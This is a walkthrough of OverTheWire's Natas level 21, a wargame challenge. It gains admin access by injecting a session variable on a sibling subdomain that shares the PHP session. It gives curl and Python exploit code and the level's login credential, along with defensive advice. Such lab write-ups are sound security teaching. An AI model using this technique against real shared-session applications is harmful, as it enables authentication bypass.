// Session Data Injection — Cross-Site Session Manipulation

21 Session Data Injection — Cross-Site Session Manipulation Hard

// Key Concepts

Session Data Injection Cross-Site Session PHP Session Authentication Bypass Collaborative Session

// Challenge Overview

This level is similar to Level 20 but with a twist — the session data is shared between two different sites (natas21 and natas21-experimenter). By manipulating the session on the experimenter site, we can gain access on the main site.

// Initial Analysis

There are two sites:

  • natas21.natas.labs.overthewire.org — The main site that checks if the user is logged in as admin.
  • natas21-experimenter.natas.labs.overthewire.org — A site that allows users to set session variables.

The source code reveals that the session data is stored in the same location (same PHPSESSID). By setting the admin variable on the experimenter site, it will be available on the main site.

<?php // natas21-experimenter/index.php if (array_key_exists("submit", $_POST)) { $_SESSION[$_POST['key']] = $_POST['value']; } // natas21/index.php if ($_SESSION["admin"] == 1) { print "Password: ..."; } ?>
💡 When sessions are shared across subdomains, a vulnerability in one application can affect another. Always isolate session data between different applications.

// Solution Walkthrough

Step 1 — Visit the experimenter site:

http://natas21-experimenter.natas.labs.overthewire.org/

Step 2 — Set the admin variable using the form:

On the experimenter site, there's a form that allows you to set session variables:

key = admin value = 1

Step 3 — Submit the form:

Click the submit button. This will set $_SESSION['admin'] = 1.

Step 4 — Visit the main site:

http://natas21.natas.labs.overthewire.org/

The session now has admin = 1 and the password for natas22 will be displayed.

Using curl:

# First, set the admin variable on the experimenter site curl -u natas21:Bpv7YbC0QJGVk1vScu86xZNTBeU3eJ4N \ --data "key=admin&value=1&submit=Submit" \ --cookie-jar cookies.txt \ http://natas21-experimenter.natas.labs.overthewire.org/ # Then, access the main site with the same cookies curl -u natas21:Bpv7YbC0QJGVk1vScu86xZNTBeU3eJ4N \ --cookie cookies.txt \ http://natas21.natas.labs.overthewire.org/

Python automation:

import requests url_exp = "http://natas21-experimenter.natas.labs.overthewire.org/" url_main = "http://natas21.natas.labs.overthewire.org/" auth = ("natas21", "Bpv7YbC0QJGVk1vScu86xZNTBeU3eJ4N") # Create a session to maintain cookies session = requests.Session() # Set the admin variable data = {"key": "admin", "value": "1", "submit": "Submit"} response = session.post(url_exp, auth=auth, data=data) # Access the main site response = session.get(url_main, auth=auth) if "Password" in response.text: print("Admin access granted!") print(response.text)

// Why It Works

The cross-site session vulnerability exists because:

  • Shared session storage: Both sites use the same session data.
  • No session isolation: The experimenter site can modify session data.
  • No validation: The main site trusts session data without validation.
  • Predictable variable name: The admin flag is simple and predictable.

// Defensive Measures

  • Use separate session storage for different applications.
  • Isolate session data using different session prefixes or separate storage.
  • Validate session data on every request.
  • Do not trust user-controlled session data without verification.
  • Use different PHPSESSID names for different applications.

// Secure Session Configuration

# In php.ini or .htaccess # Use different session names for different applications session.name = "PHPSESSID_APP1" session.save_path = "/var/lib/php/sessions/app1/" # Or in PHP code session_name("APP1_SESSION"); session_start();

// Key Takeaways

🌐 Isolate Session Data

Different applications should use separate session storage. Shared session data can lead to cross-application vulnerabilities.

🛡️ Validate Session Data

Always validate session data on the server. Don't trust it just because it's in the session.
